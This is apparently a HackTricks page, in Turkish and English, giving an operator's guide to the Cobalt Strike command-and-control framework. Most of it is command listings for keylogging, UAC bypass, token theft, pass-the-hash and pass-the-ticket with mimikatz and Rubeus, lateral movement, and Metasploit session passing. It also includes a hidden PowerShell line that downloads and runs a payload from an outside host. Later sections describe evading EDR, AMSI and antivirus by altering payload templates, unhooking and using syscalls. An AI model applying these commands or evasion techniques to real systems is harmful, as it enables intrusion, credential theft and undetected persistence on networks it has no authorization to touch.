# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` seçeneğine giderek nerede dinleme yapılacağını, hangi tür beacon kullanılacağını (http, dns, smb...) ve daha fazlasını seçebilirsiniz.

### Peer2Peer Listeners

Bu listener'ların beacon'larının doğrudan C2 ile iletişim kurması gerekmez; diğer beacon'lar üzerinden C2 ile iletişim kurabilirler.

`Cobalt Strike -> Listeners -> Add/Edit` seçeneğine gidin, ardından TCP veya SMB beacon'larını seçin.

* **TCP beacon, seçilen portta bir listener ayarlar**. Bir TCP beacon'a bağlanmak için başka bir beacon'dan `connect <ip> <port>` komutunu kullanın.
* **smb beacon, seçilen ada sahip bir pipename üzerinde dinleme yapar**. Bir SMB beacon'a bağlanmak için `link [target] [pipe]` komutunu kullanmanız gerekir.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`**, HTA dosyaları için
* **`MS Office Macro`**, macro içeren bir Office belgesi için
* **`Windows Executable`**, bir .exe, .dll veya service .exe için
* **`Windows Executable (S)`**, **stageless** bir .exe, .dll veya service .exe için (staged yerine stageless daha iyidir, daha az IoC)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` seçeneği, beacon'ı Cobalt Strike'tan indirmek için bitsadmin, exe, powershell ve python gibi formatlarda bir script/executable oluşturur.

#### Host Payloads

Host etmek istediğiniz dosya zaten bir web server üzerindeyse `Attacks -> Web Drive-by -> Host File` seçeneğine gidin ve host edilecek dosyayı ve web server yapılandırmasını seçin.

### Beacon Options

<details>
<summary>Beacon options and commands</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Custom bir agent'ın register/check-in işlemi gerçekleştirmek ve task almak için yalnızca Cobalt Strike Team Server HTTP/S protocol'ünü (varsayılan malleable C2 profile) konuşması gerekir. Cobalt Strike UI'ını tasking ve output için yeniden kullanmak üzere profile'da tanımlanan aynı URI'leri/header'ları/metadata crypto'yu implement edin.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Bir Aggressor Script (ör. `CustomBeacon.cna`), Windows olmayan beacon için payload generation işlemini wrap ederek operator'ların listener'ı seçmesini ve doğrudan GUI üzerinden ELF payload'ları üretmesini sağlayabilir.
- Team Server'a sunulan örnek Linux task handler'ları: `sleep`, `cd`, `pwd`, `shell` (rastgele komutları exec eder), `ls`, `upload`, `download` ve `exit`. Bunlar Team Server'ın beklediği task ID'lerine map edilir ve output'u doğru formatta döndürmek için server-side implement edilmeleri gerekir.
- Linux'ta BOF desteği, Beacon Object Files'ı [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) ile in-process yükleyerek eklenebilir (Outflank-style BOF'ları da destekler). Bu, yeni process'ler başlatmadan modular post-exploitation işlemlerinin implant'ın context/privileges'ı içinde çalıştırılmasını sağlar.<sup>[[2]](#references)[[3]](#references)</sup>
- Windows Beacons ile pivoting parity'sini korumak için custom beacon'a bir SOCKS handler embed edin: operator `socks <port>` çalıştırdığında implant, operator tooling'ini compromised Linux host üzerinden internal network'lere route etmek üzere local bir proxy açmalıdır.

## Opsec

### Execute-Assembly

**`execute-assembly`**, belirtilen programı çalıştırmak için remote process injection kullanan bir **sacrificial process** kullanır. Bir process'e inject etmek için her EDR'ın kontrol ettiği belirli Win API'leri kullanıldığından bu işlem oldukça gürültülüdür. Bununla birlikte, aynı process içinde bir şey yüklemek için kullanılabilecek bazı custom tool'lar vardır:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Cobalt Strike'ta BOF (Beacon Object Files) da kullanabilirsiniz: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

`https://github.com/outflanknl/HelpColor` agressor script'i, Cobalt Strike'ta komutlara renk ekleyen `helpx` komutunu oluşturur. Bu komutlar, bunların BOF (yeşil), Frok&Run (sarı) veya benzeri olduğunu ya da ProcessExecution, injection veya benzeri (kırmızı) olduğunu belirtir. Bu da hangi komutların daha stealthy olduğunu anlamaya yardımcı olur.

### Modern in-process post-execution

Recent version'lar, classic COFF BOF'un fazla kısıtlı olduğu durumlarda iki alternatif ekler:

- **Beacon Interpreter**, C'yi Team Server üzerinde intermediate bytecode'a compile eder ve Beacon içine embed edilmiş bir VM'de execute eder. Bytecode, native executable code yerine data olarak kalır; bu nedenle BOF yüklemek için normalde gereken ek executable allocation ve RW'den RX'e permission transition işleminden kaçınır. Script'ler Beacon API'yi import edebilir ve BOF-style Dynamic Function Resolution (DFR) prototype'ları declare edebilir.
- **BOF-PE**, eksiksiz bir EXE veya DLL'i mevcut Beacon'a yükler. Bu format normal PE import'larını, exception handling'i, daha gelişmiş C++'ı ve external library'leri desteklerken Beacon API'yi korur. Bu, küçük bir COFF BOF'tan daha ağırdır; bu nedenle yalnızca ek runtime faydalı olduğunda tercih edin.
```bash
# Compile a C script on the Team Server and execute its bytecode
beacon-interpreter /path/to/script.c

# Execute a BOF-PE in the current Beacon
inline-execute-pe /path/to/tool.x64.exe
```
Bu mekanizmalar loader kaynaklı sinyalleri azaltır; script'in eylemleri veya Windows API çağrıları tarafından üretilen telemetry'yi azaltmaz.<sup>[[8]](#references)</sup>

### Kullanıcı gibi davranın

`Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` gibi event'leri kontrol edebilirsiniz:

- Security EID 4624 - Olağan çalışma saatlerini öğrenmek için tüm etkileşimli logon'ları kontrol edin.
- System EID 12,13 - Kapatma/açılış/uyku sıklığını kontrol edin.
- Security EID 4624/4625 - Gelen geçerli/geçersiz NTLM denemelerini kontrol edin.
- Security EID 4648 - Bu event, plaintext credentials kullanılarak logon gerçekleştirildiğinde oluşturulur. Bir process bunu oluşturduysa binary, credentials'ı bir config dosyasında veya kodun içinde clear text olarak barındırıyor olabilir.

Cobalt Strike'tan `jump` kullanırken yeni process'in daha meşru görünmesi için `wmi_msbuild` method'unu kullanmak daha iyidir.

### Computer account'ları kullanın

Defender'ların user'lar tarafından oluşturulan anormal davranışları kontrol etmesi ve `*$` gibi **service account'ları ve computer account'ları monitoring kapsamı dışında bırakması** yaygındır. Lateral movement veya privilege escalation gerçekleştirmek için bu account'ları kullanabilirsiniz.

### Stageless payload'ları kullanın

Stageless payload'lar, C2 server'dan ikinci bir stage indirmeleri gerekmediği için staged payload'lardan daha az gürültülüdür. Bu, initial connection'dan sonra herhangi bir network traffic oluşturmamaları ve network-based defense'lar tarafından tespit edilme olasılıklarının daha düşük olması anlamına gelir.

### Token'lar ve Token Store

Token çalarken veya oluştururken dikkatli olun; bir EDR thread token'larını enumerate edebilir ve process içinde **farklı bir user'a ait bir token** veya hatta SYSTEM token'ı tespit edebilir.

Bu özellik token'ları **beacon başına** saklamanızı sağlar; böylece aynı token'ı tekrar tekrar çalmanız gerekmez. Bu, lateral movement için veya çalınmış bir token'ı birden fazla kez kullanmanız gerektiğinde faydalıdır:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Lateral movement gerçekleştirirken genellikle **yeni bir token oluşturmak** veya pass the hash attack gerçekleştirmek yerine **bir token çalmak** daha iyidir.

### Guardrails

Cobalt Strike, defender'lar tarafından tespit edilebilecek belirli command'lerin veya action'ların kullanılmasını önlemeye yardımcı olan **Guardrails** adlı bir özelliğe sahiptir. Guardrails; lateral movement veya privilege escalation için yaygın olarak kullanılan `make_token`, `jump`, `remote-exec` ve diğer command'ler gibi belirli command'leri engelleyecek şekilde yapılandırılabilir.

Ayrıca [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) adresindeki repo da bir payload çalıştırmadan önce değerlendirebileceğiniz bazı check'ler ve fikirler içerir.

### Ticket encryption

Bir AD ortamında ticket'ların encryption'ına dikkat edin. Varsayılan olarak bazı tool'lar Kerberos ticket'ları için AES encryption'dan daha az güvenli olan RC4 encryption'ı kullanır; güncel ortamlar ise varsayılan olarak AES kullanır. Bu durum, weak encryption algorithm'leri izleyen defender'lar tarafından tespit edilebilir.

### Varsayılanlardan kaçının

Cobalt Strike kullanırken SMB pipe'ları varsayılan olarak `msagent_####` ve `"status_####"` adlarına sahip olur. Bu adları değiştirin. Mevcut pipe'ların adlarını Cobalt Strike'tan şu command ile kontrol etmek mümkündür: `ls \\.\pipe\`

Ayrıca SSH session'larında `\\.\pipe\postex_ssh_####` adlı bir pipe oluşturulur. Bunu `set ssh_pipename "<new_name>";` ile değiştirin.

Ayrıca post-ex exploitation attack sırasında `\\.\pipe\postex_####` pipe'ları `set pipename "<new_name>"` ile değiştirilebilir.

Cobalt Strike profile'larında aşağıdaki unsurları da değiştirebilirsiniz:

- `rwx` kullanmaktan kaçınma
- Process injection davranışının nasıl çalıştığı (`process-inject {...}` bloğunda hangi API'lerin kullanılacağı)
- "fork and run" işleminin nasıl çalıştığı (`post-ex {…}` bloğunda)
- Sleep süresi
- Memory'ye yüklenecek binary'lerin maksimum boyutu
- `stage {...}` bloğuyla memory footprint ve DLL içeriği
- Network traffic

### Sleepmask ve BeaconGate

Sleepmask, Beacon'ı ve takip edilen heap allocation'larını dormant durumdayken dönüştürür, ardından task execution için geri yükler. Güncel sürümler evasive bir default sağlar; ancak memory layout, allocation veya call-stack gereksinimleri farklı olduğunda custom Sleepmask BOF'ları hâlâ faydalıdır. 4.13 sürümünden itibaren default Sleepmask, BeaconGate üzerinden proxy'lenen API'ler için return address'i de spoof eder.<sup>[[8]](#references)</sup>

**BeaconGate**, bu tasarımı `Sleep` işlevinin ötesine taşır: seçilen WinAPI çağrıları `FUNCTION_CALL` structure'ları olarak temsil edilir ve çağrıyı yürütürken Beacon'ı maskeyebilen Sleepmask BOF'una iletilir. Profile, bir group'u (`Comms`, `Core`, `Cleanup` veya `All`) ya da yalnızca tek tek API'leri gate edebilir:<sup>[[9]](#references)</sup>
```text
stage {
set sleep_mask "true";
set syscall_method "Indirect";

beacon_gate {
VirtualAlloc;       # Routed through BeaconGate
VirtualAllocEx;
InternetConnectA;
}
}
```
`beacon_gate` altında listelenen bir API için gate, `syscall_method` üzerinde önceliğe sahiptir; listelenmeyen API'ler yine de yapılandırılmış syscall yöntemini kullanabilir. `beacon_gate disable` ve `beacon_gate enable`, özelliği çalışma zamanında açıp kapatır. `All` seçeneğini düşünmeden etkinleştirmekten kaçının: `ps` gibi komutlar tekrar tekrar `OpenProcess`/`CloseHandle` çağırır ve her çağrı Beacon'u maskeliyor ve maske kaldırıyorsa CPU kullanımında ani artışa neden olabilir. Sleepmask-VS, custom gate'leri canlı bir implant üzerinden tekrar tekrar test etmeden debug etmek için taklit edilmiş Beacon/Sleepmask durumu sağlar.<sup>[[9]](#references)</sup>

### Gürültülü proc injections

Bir process'e code enjekte etmek genellikle oldukça gürültülüdür; bunun nedeni, **hiçbir normal process'in genellikle bu işlemi gerçekleştirmemesi ve bunu yapma yöntemlerinin oldukça sınırlı olmasıdır**. Bu nedenle, behaviour-based detection systems tarafından tespit edilebilir. Ayrıca EDR'ler, **diskte bulunmayan code içeren thread'ler** için network'ü tarayarak da bunu tespit edebilir (JIT kullanan browser'lar gibi process'ler bunu yaygın olarak gerçekleştirse de). Örnek: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID ve PPID ilişkileri

Yeni bir process oluştururken, tespit edilmekten kaçınmak için process'ler arasındaki **normal bir parent-child** ilişkisini korumak önemlidir. svchost.exec, iexplorer.exe'yi çalıştırıyorsa bu şüpheli görünür; çünkü normal bir Windows ortamında svchost.exe, iexplorer.exe'nin parent'ı değildir.

Cobalt Strike'ta yeni bir beacon oluşturulduğunda, varsayılan olarak yeni listener'ı çalıştırmak için **`rundll32.exe`** kullanan bir process oluşturulur. Bu yöntem çok stealth değildir ve EDR'ler tarafından kolayca tespit edilebilir. Ayrıca `rundll32.exe`, herhangi bir argüman olmadan çalıştırıldığından daha da şüpheli görünür.

Aşağıdaki Cobalt Strike komutuyla, yeni beacon'u spawn etmek için farklı bir process belirleyebilir ve böylece daha az tespit edilebilir hâle getirebilirsiniz:
```bash
spawnto x86 svchost.exe
```
You can also change this setting **`spawnto_x86` and `spawnto_x64`** in a profile.

### Saldırgan trafiğini proxy'leme

Saldırganların bazen araçları yerel olarak, hatta Linux makinelerde bile çalıştırabilmesi ve kurbanların trafiğinin araca ulaşmasını sağlaması gerekir (ör. NTLM relay).

Ayrıca bazen bir pass-the-hash veya pass-the-ticket saldırısı gerçekleştirmek için saldırganın bu hash'i veya ticket'ı yerel olarak kendi LSASS process'ine **eklemesi** ve ardından buradan pivot etmesi, kurban makinenin LSASS process'ini değiştirmekten daha stealth olabilir.

Ancak **oluşturulan trafik konusunda dikkatli olmanız** gerekir; backdoor process'inizden alışılmadık bir trafik (Kerberos?) gönderiyor olabilirsiniz. Bunun için bir browser process'ine pivot edebilirsiniz (ancak kendinizi bir process'e inject ederken yakalanabilirsiniz; bu nedenle bunu stealth bir şekilde yapmayı düşünün).


### AV'lerden kaçınma

#### AV/AMSI/ETW Bypass

Sayfayı kontrol edin:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Genellikle `/opt/cobaltstrike/artifact-kit` altında, Cobalt Strike'ın binary beacon'lar oluşturmak için kullanacağı payload'ların kodunu ve önceden derlenmiş template'lerini (`/src-common` içinde) bulabilirsiniz.

Oluşturulan backdoor (veya yalnızca derlenmiş template) ile [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanarak Defender'ın tetiklenmesine neyin neden olduğunu bulabilirsiniz. Bu genellikle bir string'dir. Bu nedenle backdoor'u oluşturan kodu, söz konusu string final binary'de görünmeyecek şekilde değiştirebilirsiniz.

Kodu değiştirdikten sonra aynı dizinden `./build.sh` komutunu çalıştırın ve `dist-pipe/` klasörünü Windows client'taki `C:\Tools\cobaltstrike\ArtifactKit` konumuna kopyalayın.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
`dist-pipe\artifact.cna` aggressive script'ini yüklemeyi unutmayın; böylece Cobalt Strike, yüklenen kaynakları değil, istediğimiz disk üzerindeki kaynakları kullanır.

#### Resource Kit

ResourceKit klasörü, PowerShell, VBA ve HTA dahil olmak üzere Cobalt Strike'ın script tabanlı payload'ları için şablonları içerir.

Şablonlarla birlikte [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanarak defender'ın (bu durumda AMSI) neyi beğenmediğini bulabilir ve bunu değiştirebilirsiniz:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modifying the detected lines one can generate a template that won't be caught.

Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.

#### Function hooks | Syscall

Function hooking is a very common method of EDRs to detect malicious activity. Cobalt Strike allows you to bypass these hooks by using **syscalls** instead of the standard Windows API calls using the **`None`** config, or use the `Nt*` version of a function with the **`Direct`** setting, or just jumping over the `Nt*` function with the **`Indirect`** option in the malleable profile. Depending on the system, an option might be more stealthy than the other.

This can be set in the profile or using the command **`syscall-method`**

However, this could also be noisy.

Some option granted by Cobalt Strike to bypass function hooks is to remove those hooks with: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

You could also check which functions are hooked with [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) or [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Çeşitli Cobalt Strike komutları</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>



## References

- [1] [Cobalt Strike Linux Beacon (özel implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader ve Linux BOF'ları](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF şablonu](https://github.com/outflanknl/nix_bof_template)
- [4] [Unit42'nin Cobalt Strike metadata şifrelemesi analizi](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [SANS ISC'nin Cobalt Strike trafiği hakkındaki günlüğü](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
- [8] [Cobalt Strike 4.13: Çeviride Kayboldu](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
- [9] [Cobalt Strike 4.10: BeaconGate Üzerinden](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
{{#include ../banners/hacktricks-training.md}}
